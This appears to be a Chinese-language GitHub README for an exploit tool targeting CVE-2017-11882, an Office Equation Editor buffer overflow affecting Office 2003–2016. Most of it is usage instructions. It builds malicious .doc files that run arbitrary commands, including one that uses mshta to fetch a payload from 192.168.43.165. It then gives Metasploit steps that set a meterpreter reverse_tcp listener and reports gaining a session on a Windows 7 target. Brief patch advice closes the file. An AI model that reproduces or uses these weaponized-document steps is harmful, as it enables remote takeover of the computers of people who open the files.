## CVE-2017-11882概述

从漏洞利用效果来看，它可以通杀Office 2003到2016的所有版本，并且整个攻击环境的构建非常简单。
此漏洞是由Office软件里面的 [公式编辑器] 造成的，由于编辑器进程没有对名称长度进行校验，导致缓冲区溢出，攻击者通过构造特殊的字符，可以实现任意代码执行。
举个例子，如果黑客利用这个漏洞，构造带有shell后门的office文件，当普通用户打开这个office文件，则电脑可以被黑客直接控制。


## 影响版本： 
```
office 2003 
office 2007 
office 2010 
office 2013 
office 2016
```

## Usage

```
python Command_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o test.doc
```

![Image](https://github.com/littlebin404/CVE-2017-11882/blob/master/img/1.png)

点击生成的”test.doc”,顺利弹出计算机工具。


```
python Command_CVE-2017-11882.py -c "mshta http://192.168.43.165:8080/11882" -o 11882-3.doc
```

![Image](https://github.com/littlebin404/CVE-2017-11882/blob/master/img/2.png)

![Image](https://github.com/littlebin404/CVE-2017-11882/blob/master/img/3.png)

成功生成11882-3.doc word文件。



将cve_2017_11882.rb文件放到/usr/share/metasploit-framework/modules/exploits/windows/smb目录下：
```
msf > search CVE-2017-11882
msf > use exploit/windows/smb/CVE-2017-11882 
msf exploit(CVE-2017-11882) > set payload windows/meterpreter/reverse_tcp 
msf exploit(CVE-2017-11882) > set lhost 192.168.43.165 
msf exploit(CVE-2017-11882) > set uripath 11882 
msf exploit(CVE-2017-11882) > exploit
```

开启监听状态：

![Image](https://github.com/littlebin404/CVE-2017-11882/blob/master/img/4.png)

点击win7靶机中的11882-3.doc文件，获取sessions成功！

![Image](https://github.com/littlebin404/CVE-2017-11882/blob/master/img/5.png)

## 漏洞修复
①在线更新；开启Windows Update更新，这种方式对于大部分人来说就够了。 

②打补丁；此漏洞对应的微软补丁地址：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882
